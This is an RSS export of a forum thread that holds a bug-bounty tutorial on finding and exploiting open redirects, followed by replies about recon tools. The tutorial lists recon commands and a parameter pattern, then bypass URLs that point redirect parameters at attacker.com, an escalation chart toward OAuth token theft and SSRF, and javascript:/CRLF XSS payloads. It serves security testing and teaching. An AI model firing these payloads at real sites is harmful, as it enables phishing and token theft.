<?xml version="1.0" encoding="UTF-8" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:dc="http://purl.org/dc/elements/1.1/">
  <channel>
    <title>Open Redirection Guide</title>
    <link>https://0x00sec.org/t/open-redirection-guide/21118</link>
    <description>## Identifing possible vulnerable endpoints:
* [gau](https://github.com/lc/gau) or [waybackurls](https://github.com/tomnomnom/waybackurls) + [hakrawler](https://github.com/hakluke/hakrawler) + [gf](https://github.com/tomnomnom/gf)
	
	*1*. ``cat subdomains | gau | tee -a urls``
	*2*. ``cat subdomains | hakrawler -depth 3 -plain | tee -a urls``
	*3*. ``gf redirect urls``

	using ``redirect.json`` with `gf`:
```json
{
    &quot;flags&quot; : &quot;-HanrE&quot;,
    &quot;pattern&quot; : &quot;url=|rt=|cgi-bin/redirect.cgi|continue=|dest=|destination=|go=|out=|redir=|redirect_uri=|redirect_url=|return=|return_path=|returnTo=|rurl=|target=|view=|from_url=|load_url=|file_url=|page_url=|file_name=|page=|folder=|folder_url=|login_url=|img_url=|return_url=|return_to=|next=|redirect=|redirect_to=|logout=|checkout=|checkout_url=|goto=|next_page=|file=|load_file=|turl=&quot;
}
```
* Google dorks
``site:domain.com inurl:[PARAMETER]`` using a [parameter list](https://github.com/victoni/Bug-Bounty-Scripts/blob/master/lists/open_redirection_parameters.txt)
* Manual inspection by navigating the webapp and intercepting the requests


## Confirm and exploit:
```text
* https://company.com/?redirect=http://attacker.com
* https://company.com/?redirect=http://company.com.attacker.com
* https://company.com/?redirect=https://company.com@attacker.com
* https://company.com/?redirect=//attacker.com
* https://company.com/?redirect=\/\/attacker.com
* https://company.com/?redirect=http://attacker.com#company.com
* https://company.com/?redirect=http://attacker.com?company.com
* https://company.com/?redirect=http://attacker.com/company.com
* https://company.com/?redirect=http://ⓐⓣⓣⓐⓒⓚⓔⓡ.ⓒⓞⓜ

If you found a POST-based request vulnerable to open redirection,
try to turn it into a GET request by appending the POST parameters
to the URL as GET parameters.

Using special characters:
① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ 
⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ 
⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛ 
⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵ 
Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ 
ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ 
⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ ⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿ 。
```
[Special characters&#39; source](https://twitter.com/hahwul)

## Escalating to other vulnerabilities:
```
Open Redirect + Miconfigured OAuth App =&gt; OAuth Token Stealing
Open Redirect + Filtered SSRF =&gt; SSRF
Open Redirect + CRLFi =&gt; XSS
Open Redirect + javascript URI =&gt; XSS
```
 [Source](https://twitter.com/LooseSecurity/status/1120638007760117760)
\
Escalate to XSS
* `` https://company.com/?redirect=javascript:alert(1)``
* `` https://company.com/?redirect=javascript:prompt(1)``

Escalate to XSS using CRLFi
* ``https://company.com/?redirect=java%0d%0ascript%0d%0a:alert(0)``</description>
    
    <lastBuildDate>Mon, 27 Mar 2023 07:39:11 +0000</lastBuildDate>
    <category>Bug Bounty</category>
    <atom:link href="https://0x00sec.org/t/open-redirection-guide/21118.rss" rel="self" type="application/rss+xml" />
      <item>
        <title>Open Redirection Guide</title>
        <dc:creator><![CDATA[vict0ni]]></dc:creator>
        <description><![CDATA[
            <p>It is true that many people (beginners or not) do use most famous tools and grab most low-hanging fruits. I personally use dalfox in endpoints where there is an indication of a possible XSS but I can’t pop it for some reason. Also, many beginners use dalfox but on the standard recon they do. More recon = more surface for the tool to work</p>
          <p><a href="https://0x00sec.org/t/open-redirection-guide/21118/15">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/open-redirection-guide/21118/15</link>
        <pubDate>Mon, 27 Mar 2023 07:39:11 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-21118-15</guid>
        <source url="https://0x00sec.org/t/open-redirection-guide/21118.rss">Open Redirection Guide</source>
      </item>
      <item>
        <title>Open Redirection Guide</title>
        <dc:creator><![CDATA[0xgreyhound]]></dc:creator>
        <description><![CDATA[
            <p>fuck automation like dalfox in bbp every beginner running same tools like dalfox</p>
          <p><a href="https://0x00sec.org/t/open-redirection-guide/21118/13">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/open-redirection-guide/21118/13</link>
        <pubDate>Thu, 23 Mar 2023 05:20:57 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-21118-13</guid>
        <source url="https://0x00sec.org/t/open-redirection-guide/21118.rss">Open Redirection Guide</source>
      </item>
      <item>
        <title>Open Redirection Guide</title>
        <dc:creator><![CDATA[DamaneDz]]></dc:creator>
        <description><![CDATA[
            <p>I didn’t try kxss but I see it as an old thing ! So no idea about the difference … but I’m sure you’ll like dalfox <img src="https://0x00sec.org/images/emoji/twitter/blush.png?v=9" title=":blush:" class="emoji" alt=":blush:"></p>
          <p><a href="https://0x00sec.org/t/open-redirection-guide/21118/12">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/open-redirection-guide/21118/12</link>
        <pubDate>Wed, 13 May 2020 22:31:21 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-21118-12</guid>
        <source url="https://0x00sec.org/t/open-redirection-guide/21118.rss">Open Redirection Guide</source>
      </item>
      <item>
        <title>Open Redirection Guide</title>
        <dc:creator><![CDATA[pry0cc]]></dc:creator>
        <description><![CDATA[
            <p>You NEED to share your findings when you get some basics up.</p>
          <p><a href="https://0x00sec.org/t/open-redirection-guide/21118/11">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/open-redirection-guide/21118/11</link>
        <pubDate>Wed, 13 May 2020 20:43:08 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-21118-11</guid>
        <source url="https://0x00sec.org/t/open-redirection-guide/21118.rss">Open Redirection Guide</source>
      </item>
      <item>
        <title>Open Redirection Guide</title>
        <dc:creator><![CDATA[vict0ni]]></dc:creator>
        <description><![CDATA[
            <p>I’ve seen it and I actually want to try it for a long time! So, will do <img src="https://0x00sec.org/images/emoji/twitter/smile.png?v=9" title=":smile:" class="emoji" alt=":smile:"> I also sourced hahwul under the special characters</p>
          <p><a href="https://0x00sec.org/t/open-redirection-guide/21118/10">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/open-redirection-guide/21118/10</link>
        <pubDate>Wed, 13 May 2020 14:43:46 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-21118-10</guid>
        <source url="https://0x00sec.org/t/open-redirection-guide/21118.rss">Open Redirection Guide</source>
      </item>
      <item>
        <title>Open Redirection Guide</title>
        <dc:creator><![CDATA[pry0cc]]></dc:creator>
        <description><![CDATA[
            <p>Do you find it works better?</p>
<p>What are the key benefits / differentiators that you see?</p>
          <p><a href="https://0x00sec.org/t/open-redirection-guide/21118/9">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/open-redirection-guide/21118/9</link>
        <pubDate>Wed, 13 May 2020 14:24:44 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-21118-9</guid>
        <source url="https://0x00sec.org/t/open-redirection-guide/21118.rss">Open Redirection Guide</source>
      </item>
      <item>
        <title>Open Redirection Guide</title>
        <dc:creator><![CDATA[DamaneDz]]></dc:creator>
        <description><![CDATA[
            <aside class="quote group-VIP quote-modified" data-username="vict0ni" data-post="1" data-topic="21118">
<div class="title">
<div class="quote-controls"></div>
<img alt="" width="20" height="20" src="https://0x00sec.org/user_avatar/0x00sec.org/vict0ni/40/14011_2.png" class="avatar"> vict0ni:</div>
<blockquote>
<p><em>1</em> . <code>cat subdomains | waybackurls | tee -a urls</code><br>
<em>2</em> . <code>cat subdomains | hakrawler -depth 3 -plain | tee -a urls</code><br>
<em>3</em> . <code>gf redirect urls</code></p>
</blockquote>
</aside>
<p>I think you should use dalfox instead of kxss</p>
<aside class="onebox allowlistedgeneric">
  <header class="source">
      <img src="https://github.githubassets.com/favicons/favicon.svg" class="site-icon" width="32" height="32">
      <a href="https://github.com/hahwul/dalfox" target="_blank" rel="noopener nofollow ugc">GitHub</a>
  </header>
  <article class="onebox-body">
    <img src="https://0x00sec.s3.amazonaws.com/original/2X/b/b4a721b45198978494d32f6b4f824f4b87abd82b.jpeg" class="thumbnail" width="" height="">

<h3><a href="https://github.com/hahwul/dalfox" target="_blank" rel="noopener nofollow ugc">hahwul/dalfox</a></h3>

<p>🌘🦊 DalFox(Finder Of XSS) / Parameter Analysis and XSS Scanning tool based on golang - hahwul/dalfox</p>


  </article>
  <div class="onebox-metadata">
    
    
  </div>
  <div style="clear: both"></div>
</aside>

          <p><a href="https://0x00sec.org/t/open-redirection-guide/21118/8">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/open-redirection-guide/21118/8</link>
        <pubDate>Wed, 13 May 2020 14:23:47 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-21118-8</guid>
        <source url="https://0x00sec.org/t/open-redirection-guide/21118.rss">Open Redirection Guide</source>
      </item>
      <item>
        <title>Open Redirection Guide</title>
        <dc:creator><![CDATA[Danus]]></dc:creator>
        <description><![CDATA[
            <p>I don’t know Linux or web but this looks detailed nevertheless!</p>
          <p><a href="https://0x00sec.org/t/open-redirection-guide/21118/7">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/open-redirection-guide/21118/7</link>
        <pubDate>Mon, 11 May 2020 07:51:16 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-21118-7</guid>
        <source url="https://0x00sec.org/t/open-redirection-guide/21118.rss">Open Redirection Guide</source>
      </item>
      <item>
        <title>Open Redirection Guide</title>
        <dc:creator><![CDATA[vict0ni]]></dc:creator>
        <description><![CDATA[
            <p>Yup! tomnomnom’s tools are sick!</p>
          <p><a href="https://0x00sec.org/t/open-redirection-guide/21118/6">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/open-redirection-guide/21118/6</link>
        <pubDate>Sun, 10 May 2020 20:44:44 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-21118-6</guid>
        <source url="https://0x00sec.org/t/open-redirection-guide/21118.rss">Open Redirection Guide</source>
      </item>
      <item>
        <title>Open Redirection Guide</title>
        <dc:creator><![CDATA[pry0cc]]></dc:creator>
        <description><![CDATA[
            <p>ALSO: Do you happen to know where I can find kxss?</p>
<p>EDIT: Found it, in toms hacks repo.</p>
<aside class="onebox allowlistedgeneric">
  <header class="source">
      <img src="https://github.githubassets.com/favicons/favicon.svg" class="site-icon" width="32" height="32">
      <a href="https://github.com/tomnomnom/hacks/tree/master/kxss" target="_blank" rel="noopener">GitHub</a>
  </header>
  <article class="onebox-body">
    <img src="https://0x00sec.s3.amazonaws.com/original/2X/7/79d91e9e925ac8bc9d6f1b26dda9b9a927fdd905.jpeg" class="thumbnail" width="" height="">

<h3><a href="https://github.com/tomnomnom/hacks/tree/master/kxss" target="_blank" rel="noopener">tomnomnom/hacks</a></h3>

<p>A collection of hacks and one-off scripts. Contribute to tomnomnom/hacks development by creating an account on GitHub.</p>


  </article>
  <div class="onebox-metadata">
    
    
  </div>
  <div style="clear: both"></div>
</aside>

          <p><a href="https://0x00sec.org/t/open-redirection-guide/21118/5">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/open-redirection-guide/21118/5</link>
        <pubDate>Sun, 10 May 2020 20:41:15 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-21118-5</guid>
        <source url="https://0x00sec.org/t/open-redirection-guide/21118.rss">Open Redirection Guide</source>
      </item>
      <item>
        <title>Open Redirection Guide</title>
        <dc:creator><![CDATA[pry0cc]]></dc:creator>
        <description><![CDATA[
            <p>Looks really interesting.</p>
<p>I’d love to put together a few bug-bounty esq hacks and automation tips for pentests so I can transfer the bug-founding power of the community into something I can fire off and get alerts for.</p>
<p>Almost be epic to chain together a bunch of stuff and have it give us Discord notifications through a webhook everytime it finds something!</p>
          <p><a href="https://0x00sec.org/t/open-redirection-guide/21118/4">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/open-redirection-guide/21118/4</link>
        <pubDate>Sun, 10 May 2020 20:41:01 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-21118-4</guid>
        <source url="https://0x00sec.org/t/open-redirection-guide/21118.rss">Open Redirection Guide</source>
      </item>
      <item>
        <title>Open Redirection Guide</title>
        <dc:creator><![CDATA[vict0ni]]></dc:creator>
        <description><![CDATA[
            <p>I haven’t actually used it yet but I saw <a href="https://twitter.com/Enesdex/status/1256350373259993090?s=20">this</a> tweet the other day and I would like to try it out</p>
          <p><a href="https://0x00sec.org/t/open-redirection-guide/21118/3">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/open-redirection-guide/21118/3</link>
        <pubDate>Sun, 10 May 2020 20:37:00 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-21118-3</guid>
        <source url="https://0x00sec.org/t/open-redirection-guide/21118.rss">Open Redirection Guide</source>
      </item>
      <item>
        <title>Open Redirection Guide</title>
        <dc:creator><![CDATA[pry0cc]]></dc:creator>
        <description><![CDATA[
            <p>Thanks so much for pointing out <a href="https://github.com/hakluke/hakrawler">hakrawler</a>! Been looking for a fast go HTTP crawler like this!</p>
<p>Have you tried doing XSS analysis too with kxss? A similar loop?</p>
          <p><a href="https://0x00sec.org/t/open-redirection-guide/21118/2">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/open-redirection-guide/21118/2</link>
        <pubDate>Sun, 10 May 2020 20:30:41 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-21118-2</guid>
        <source url="https://0x00sec.org/t/open-redirection-guide/21118.rss">Open Redirection Guide</source>
      </item>
      <item>
        <title>Open Redirection Guide</title>
        <dc:creator><![CDATA[vict0ni]]></dc:creator>
        <description><![CDATA[
            <h2>Identifing possible vulnerable endpoints:</h2>
<ul>
<li>
<p><a href="https://github.com/lc/gau">gau</a> or <a href="https://github.com/tomnomnom/waybackurls">waybackurls</a> + <a href="https://github.com/hakluke/hakrawler">hakrawler</a> + <a href="https://github.com/tomnomnom/gf">gf</a></p>
<p><em>1</em>. <code>cat subdomains | gau | tee -a urls</code><br>
<em>2</em>. <code>cat subdomains | hakrawler -depth 3 -plain | tee -a urls</code><br>
<em>3</em>. <code>gf redirect urls</code></p>
<p>using <code>redirect.json</code> with <code>gf</code>:</p>
</li>
</ul>
<pre><code class="lang-json">{
    "flags" : "-HanrE",
    "pattern" : "url=|rt=|cgi-bin/redirect.cgi|continue=|dest=|destination=|go=|out=|redir=|redirect_uri=|redirect_url=|return=|return_path=|returnTo=|rurl=|target=|view=|from_url=|load_url=|file_url=|page_url=|file_name=|page=|folder=|folder_url=|login_url=|img_url=|return_url=|return_to=|next=|redirect=|redirect_to=|logout=|checkout=|checkout_url=|goto=|next_page=|file=|load_file=|turl="
}
</code></pre>
<ul>
<li>Google dorks<br>
<code>site:domain.com inurl:[PARAMETER]</code> using a <a href="https://github.com/victoni/Bug-Bounty-Scripts/blob/master/lists/open_redirection_parameters.txt">parameter list</a>
</li>
<li>Manual inspection by navigating the webapp and intercepting the requests</li>
</ul>
<h2>Confirm and exploit:</h2>
<pre><code class="lang-nohighlight">* https://company.com/?redirect=http://attacker.com
* https://company.com/?redirect=http://company.com.attacker.com
* https://company.com/?redirect=https://company.com@attacker.com
* https://company.com/?redirect=//attacker.com
* https://company.com/?redirect=\/\/attacker.com
* https://company.com/?redirect=http://attacker.com#company.com
* https://company.com/?redirect=http://attacker.com?company.com
* https://company.com/?redirect=http://attacker.com/company.com
* https://company.com/?redirect=http://ⓐⓣⓣⓐⓒⓚⓔⓡ.ⓒⓞⓜ

If you found a POST-based request vulnerable to open redirection,
try to turn it into a GET request by appending the POST parameters
to the URL as GET parameters.

Using special characters:
① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ 
⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ 
⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛ 
⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵ 
Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ 
ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ 
⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ ⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿ 。
</code></pre>
<p><a href="https://twitter.com/hahwul">Special characters’ source</a></p>
<h2>Escalating to other vulnerabilities:</h2>
<pre><code class="lang-auto">Open Redirect + Miconfigured OAuth App =&gt; OAuth Token Stealing
Open Redirect + Filtered SSRF =&gt; SSRF
Open Redirect + CRLFi =&gt; XSS
Open Redirect + javascript URI =&gt; XSS
</code></pre>
<p><a href="https://twitter.com/LooseSecurity/status/1120638007760117760">Source</a><br>
<br>
Escalate to XSS</p>
<ul>
<li><code> https://company.com/?redirect=javascript:alert(1)</code></li>
<li><code> https://company.com/?redirect=javascript:prompt(1)</code></li>
</ul>
<p>Escalate to XSS using CRLFi</p>
<ul>
<li><code>https://company.com/?redirect=java%0d%0ascript%0d%0a:alert(0)</code></li>
</ul>
          <p><a href="https://0x00sec.org/t/open-redirection-guide/21118/1">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/open-redirection-guide/21118/1</link>
        <pubDate>Sun, 10 May 2020 20:08:35 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-21118-1</guid>
        <source url="https://0x00sec.org/t/open-redirection-guide/21118.rss">Open Redirection Guide</source>
      </item>
  </channel>
</rss>
